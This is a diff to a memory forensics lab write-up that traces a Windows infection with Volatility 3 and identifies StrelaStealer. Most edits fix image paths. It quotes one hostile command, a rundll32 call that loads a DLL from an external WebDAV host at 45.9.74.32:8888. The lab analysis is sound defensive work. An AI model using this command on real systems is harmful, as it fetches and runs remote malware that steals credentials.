@@ -53,10 +53,10 @@ On the 15-07-2024 at approximately 07:00 UTC, a Windows workstation used by a us
 
 All plugin output was collected in a single pass using a custom Volatility 3 batch script ([Volatility plugin script file](../scripts/volatility-batch.sh)).
 
-![Custom volatility plugin script execution](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_execute-standard-volatility-plugins.png)
+![Custom volatility plugin script execution](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_execute-standard-volatility-plugins.png)
 
 The following steps reflect the sequence of investigation from the output.
-
+H
 ### Step 1 - Initial Triage (window.info)
 
 **Why:** To confirm the OS version, architecture.
@@ -65,7 +65,7 @@ The following steps reflect the sequence of investigation from the output.
 cat output/info.txt
 ```
 
-![windows.info showing system information](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_windows-info-plugin.png)
+![windows.info showing system information](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_windows-info-plugin.png)
 
 **Findings:** Windows 10, 64-bit architecture, timestamp 2024-07-15 07:00:08 UTC.
 
@@ -75,7 +75,7 @@ cat output/info.txt
 
 **Why:** To identify find suspicious parent-child process relationships and command line arguments.
 
-![pstree showing powershell process under unknown terminated process](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_pstree-powershell-chain.png)
+![pstree showing powershell process under unknown terminated process](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_pstree-powershell-chain.png)
 
 **Findings:** The following chain was identified in the process tree:
 
@@ -110,7 +110,7 @@ D: **`rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`** - rundll32 executi
 cat output/pslist.txt
 ```
 
-![pslist showing powershell entry](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_pslist-powershell.png)
+![pslist showing powershell entry](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_pslist-powershell.png)
 
 **Findings:** The `powershell.exe` process' confirmed PID and PPID are 4120 and 3692 respectively. No process hiding detected because I found no discrepancy between pslist and pstree.
 
@@ -122,7 +122,7 @@ cat output/pslist.txt
 cat output/netscan.txt
 ```
 
-![netscan showing established connection to 45.9.74.32:8888](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_netscan-external-connection.png)
+![netscan showing established connection to 45.9.74.32:8888](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_netscan-external-connection.png)
 
 **Findings:** An established external connection found:
 
@@ -144,7 +144,7 @@ To get an unambiguous evidence of the command the attacker instructed Powershell
 cat output/cmdline.txt
 ```
 
-![cmdline output for process with PID 3692](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_cmdline-pid3692.png)
+![cmdline output for process with PID 3692](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_cmdline-pid3692.png)
 
 **Findings:** Process and full command executed by Powershell
 
@@ -168,7 +168,7 @@ cat output/cmdline.txt
 vol3 -f 192-Reveal.dmp windows.envars --pid 3692 | grep USERNAME
 ```
 
-![envars output showing USERNAME malicious process ran on](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_netscan-envars-username-elon.png)
+![envars output showing USERNAME malicious process ran on](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_netscan-envars-username-elon.png)
 
 **Findings:** Username found to be `Elon`
 
@@ -182,7 +182,7 @@ vol3 -f 192-Reveal.dmp windows.envars --pid 3692 | grep USERNAME
 
 **IP was submitted:** `45.9.74.32` → `virustotal.com`
 
-![VirusTotal results showing STRELASTEALER identification](../assets/cyberdefenders%20memory%20forensics/2026-05-29_reveal_virustotal-strelastealer.png)
+![VirusTotal results showing STRELASTEALER identification](../../assets/cyberdefenders-memory-forensics/2026-05-29_reveal_virustotal-strelastealer.png)
 
 **Findings:** Security vendors flagged the IP address as malicious and activity identified as **STRELASTEALER**.
 
